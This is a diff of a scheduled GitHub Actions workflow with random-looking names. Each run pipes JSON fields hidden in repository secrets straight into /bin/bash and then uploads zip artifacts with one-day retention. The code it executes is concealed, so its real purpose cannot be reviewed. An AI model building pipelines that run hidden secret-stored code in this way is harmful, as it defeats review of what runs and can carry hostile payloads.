@@ -1,34 +1,26 @@
 name: cuixinjunzhi
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '31 0/6 * * *'
 
-jobs:  # 26096
+  schedule:
+    - cron: '54 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: cuixinjunzhi
         env:
-          qxs99163: ${{ secrets.qxs99163 }}
+          gl44982: ${{ secrets.gl44982 }}
         run: |
-          echo $qxs99163 | jq -r .ocy2 | /bin/bash
-          echo $ga88481 | jq -r .bkf2 | /bin/bash
-          echo $pmrvs5 | jq -r .aagjy70521 | /bin/bash
-          echo $d43 | jq -r .rgot794 | /bin/bash
-          echo $n0454 | jq -r .s262 | /bin/bash
-          echo $q42283 | jq -r .iv3 | /bin/bash
-          echo $up68 | jq -r .yhbdr2578 | /bin/bash
-          echo $pnsvn16 | jq -r .rfj52470 | /bin/bash
-          echo $nfoqu03509 | jq -r .l43 | /bin/bash
-          echo $dl3 | jq -r .pny139 | /bin/bash
-          echo $fj6 | jq -r .cg0 | /bin/bash
-          echo $zwbu12 | jq -r .knc7 | /bin/bash
-          echo $yf79 | jq -r .f173 | /bin/bash
-          echo $ppu0966 | jq -r .gpuah4883 | /bin/bash
-          echo $yhlm570 | jq -r .dwlg6 | /bin/bash
-          echo $n3 | jq -r .zyccs5 | /bin/bash
-          echo $i0633 | jq -r .rhm13074 | /bin/bash
+          printf '%s' "$gl44982" | jq -r .vogtr65350 | /bin/bash
+          printf '%s' "$yyu79" | jq -r .qfgv347 | /bin/bash
+          printf '%s' "$porkf93594" | jq -r .xtn0 | /bin/bash
+          printf '%s' "$ld837" | jq -r .w797 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: q2R9pK9b
+          path: "*.zip"
+          retention-days: 1
